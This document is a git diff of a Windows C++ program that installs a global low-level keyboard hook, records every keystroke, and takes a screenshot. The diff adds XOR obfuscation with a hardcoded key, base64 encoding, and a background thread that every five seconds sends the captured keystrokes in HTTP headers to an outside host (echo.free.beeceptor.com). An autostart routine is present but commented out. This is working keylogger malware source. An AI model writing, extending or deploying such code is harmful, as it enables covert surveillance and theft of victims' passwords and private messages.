@@ -3,19 +3,112 @@
 #include "base64.h"
 #include "HTTPRequest.hpp"
 #include <windows.h>
+#include <thread>
+#include <deque>
+#include <mutex>
 
 
 
-
-using namespace std;
 
 HHOOK hHook = NULL;
 bool capsLock = false;
 
+std::string recordedKeystrokes = "";
+
+std::mutex recordedKeystrokesMutex;
+
+std::string XOR(std::string message, std::string key)
+{
+    std::string processedMessage = message;
+    int message_length = message.size();
+    int key_length = key.size();
+    for(int i = 0;i<message_length;i++)
+    {
+        processedMessage[i] = message[i]^key[i%key_length];
+    }
+
+    return processedMessage;
+}
+
+
+void addToRecordedKeystrokes(std::string value)
+{
+    std::unique_lock<std::mutex> lock(recordedKeystrokesMutex);
+    recordedKeystrokes += value;
+}
+
+
+
+std::string getRecordedKeystrokes()
+{
+    std::unique_lock<std::mutex> lock(recordedKeystrokesMutex);
+    return recordedKeystrokes;
+}
+
+
+
+
+
+void sendGetRequest(std::string url)
+{
+    try
+    {
+        // you can pass http::InternetProtocol::V6 to Request to make an IPv6 request
+        http::Request request{url};
+        const std::vector<unsigned char> body{};
+
+        std::vector<std::pair<std::string, std::string>> headers;
+
+        headers.emplace_back(std::pair<std::string,std::string>("imageBase64Encoded","blablub"));
+        headers.emplace_back(std::pair<std::string,std::string>("recordedKeystrokes",base64_encode(XOR(getRecordedKeystrokes(),"ohlongjohnson"))));
+
+        // send a get request
+        const auto response = request.send("GET",body,headers);
+
+        std::cout << std::string{response.body.begin(), response.body.end()} << '\n'; // print the result
+    }
+    catch (const std::exception& e)
+    {
+        std::cerr << "Request failed, error: " << e.what() << '\n';
+    }
+
+}
+
+void sendPostRequest(std::string url)
+{
+    try
+    {
+        http::Request request{url};
+        const std::string body = "foo=1&bar=baz";
+
+        const auto response = request.send("POST", body, {
+                                                             {"Content-Type", "application/x-www-form-urlencoded"}
+                                                         });
+
+        std::string result(response.body.begin(), response.body.end());
+        std::cout << result << '\n';
+    }
+    catch (const std::exception& e)
+    {
+        std::cerr << "Request failed: " << e.what() << '\n';
+    }
+}
+
+void deliveryThread()
+{
+    for(;;)
+    {
+        Sleep(5000);
+        sendGetRequest("http://echo.free.beeceptor.com");
+        //sendPostRequest("http://echo.free.beeceptor.com");
+    }
+
+}
+
 
 std::string convertUnsignedCharVectorToString(std::vector<unsigned char> vector)
 {
-    string s = "";
+    std::string s = "";
 
     for(auto &uc : vector)
     {
@@ -46,6 +139,20 @@ LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM
 
         BYTE lpKeyState[256];
         GetKeyboardState(lpKeyState);
+
+
+        if (wVirtKey == VK_BACK)
+        {
+            addToRecordedKeystrokes("[Backspace]");
+            //recordedKeystrokes += "[Backspace]";
+            return CallNextHookEx(hHook, code, wParam, lParam);
+        }
+        else if(wVirtKey == VK_RETURN)
+        {
+            addToRecordedKeystrokes("[Return]");
+            //recordedKeystrokes += "[Return]";
+            return CallNextHookEx(hHook, code, wParam, lParam);
+        }
 
 
         if (wVirtKey == VK_CAPITAL)
@@ -100,6 +207,7 @@ LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM
 
         wchar_t wbuffer[64] = { 0 };
 
+
         int result = ToUnicodeEx(wVirtKey,wScanCode,lpKeyState,wbuffer,sizeof(wbuffer)/sizeof(wbuffer[0]),0,GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
 
 
@@ -107,7 +215,11 @@ LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM
         {
             char buffer[64] = { 0 };
             WideCharToMultiByte(CP_UTF8, 0, wbuffer, result, buffer, sizeof(buffer) / sizeof(char), NULL, NULL);
-            std::cout << buffer;
+
+            addToRecordedKeystrokes(buffer);
+            //recordedKeystrokes += buffer;
+            //std::cout << recordedKeystrokes << std::endl;
+            //sendGetRequest("http://echo.free.beeceptor.com");
         }
 
 
@@ -217,32 +329,7 @@ std::vector<unsigned char> getScreenshot()
     return png;
 }
 
-int sendGetRequest(string url)
-{
-    try
-    {
-        // you can pass http::InternetProtocol::V6 to Request to make an IPv6 request
-        http::Request request{url};
-        const std::vector<unsigned char> body{};
 
-        const std::vector<std::pair<std::string, std::string>> headers{
-            {"Accept", "application/json"},
-            {"User-Agent", "MyCppClient/1.0"},
-            {"X-Custom-Header", "my-value"}
-        };
-
-        // send a get request
-        const auto response = request.send("GET",body,headers);
-
-        std::cout << std::string{response.body.begin(), response.body.end()} << '\n'; // print the result
-    }
-    catch (const std::exception& e)
-    {
-        std::cerr << "Request failed, error: " << e.what() << '\n';
-    }
-    return 0;
-
-}
 
 int main()
 {
@@ -253,20 +340,31 @@ int main()
 
     //addToAutostart();
 
-
-    //std::cout << r.text;
-
-    string screenB64 = base64_encode(convertUnsignedCharVectorToString(getScreenshot()));
+    std::string screenB64 = base64_encode(convertUnsignedCharVectorToString(getScreenshot()));
     lodepng::save_file(convertStringToUnsignedCharVector(base64_decode(screenB64)),"test.png");
     capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
-    if (hHook == NULL) {
+    if (hHook == NULL)
+    {
         std::cerr << "Keyboard hook failed!" << std::endl;
         return 1;
     }
 
-    sendGetRequest("http://echo.free.beeceptor.com");
 
+    std::string m = "Hast du mal ne Kippe?";
+    std::string k = "geheimnisvolles geheimpasswort";
+
+    /*std::cout<< "Before Encryption:" << m << std::endl;
+    m = XOR(m,k);
+    std::cout << "After Encryption:" << std::endl;
+    std::cout << m;
+    std::cout << std::endl;
+    m = XOR(m,k);
+    std::cout << "After Decryption:" << m << std::endl;*/
+
+    std::thread b(deliveryThread);
     while (GetMessage(NULL, NULL, 0, 0));
+
+
     return 0;
 }
